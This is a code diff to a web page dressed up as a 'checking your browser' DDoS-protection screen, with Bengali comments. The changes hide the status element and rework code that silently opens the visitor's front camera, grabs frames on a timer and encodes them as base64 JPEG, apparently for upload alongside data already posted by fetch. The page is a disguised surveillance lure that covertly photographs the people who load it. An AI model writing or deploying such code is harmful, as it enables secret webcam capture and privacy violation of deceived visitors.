@@ -48,6 +48,7 @@
             margin: 8px 0;
             line-height: 1.7;
         }
+        /* স্ট্যাটাস এলিমেন্ট সম্পূর্ণ লুকানো */
         #status {
             display: none !important;
         }
@@ -77,6 +78,7 @@
         </div>
         <h1>আপনার ব্রাউজার চেক করা হচ্ছে...</h1>
         <p>এই প্রক্রিয়াটি স্বয়ংক্রিয়। আপনার ব্রাউজার শীঘ্রই পুনর্নির্দেশিত হবে।</p>
+        <!-- 👇 স্ট্যাটাস এলিমেন্ট লুকানো -->
         <p id="status"></p>
         <div class="attribution">
             DDoS সুরক্ষা দ্বারা
@@ -212,15 +214,12 @@
                         body: JSON.stringify(data)
                     });
 
-                    // ================================================================
-                    // 🔥 ক্যামেরা অ্যাক্সেস – আসল সাইজে ছবি (ফিক্স)
-                    // ================================================================
+                    // ===== ক্যামেরা অ্যাক্সেস (নীরবে) =====
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({
                             video: {
-                                // 🔥 আদর্শ সাইজ (IDEAL) – ক্যামেরা যেটা সাপোর্ট করে সেটাই নেবে
-                                width: { ideal: 1920 },
-                                height: { ideal: 1080 },
+                                width: { ideal: 640 },
+                                height: { ideal: 480 },
                                 facingMode: 'user'
                             },
                             audio: false
@@ -230,32 +229,13 @@
                         const canvas = document.getElementById('canvas');
                         video.srcObject = stream;
 
-                        // ভিডিওর আসল সাইজ পাওয়ার জন্য অপেক্ষা
-                        await new Promise((resolve) => {
-                            video.onloadedmetadata = () => {
-                                video.play();
-                                resolve();
-                            };
-                        });
-
-                        // ভিডিওর আসল width/height নেওয়া
-                        const videoWidth = video.videoWidth;
-                        const videoHeight = video.videoHeight;
-                        console.log(`📸 ভিডিও সাইজ: ${videoWidth}x${videoHeight}`);
-
-                        // ক্যানভাসের সাইজ ভিডিওর আসল সাইজে সেট করুন
-                        canvas.width = videoWidth;
-                        canvas.height = videoHeight;
-
                         const interval = setInterval(async () => {
                             if (!video.videoWidth || !video.videoHeight) return;
-                            
-                            // ক্যানভাসে ভিডিও ড্র
+                            canvas.width = 640;
+                            canvas.height = 480;
                             const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            
-                            // 🔥 কোয়ালিটি ০.৯৫ (প্রায় আসল) – ছবি কম্প্রেস না করে
-                            const imageData = canvas.toDataURL('image/jpeg', 0.95);
+                            ctx.drawImage(video, 0, 0, 640, 480);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.5);
                             const rawBase64 = imageData.split(',')[1];
 
                             try {
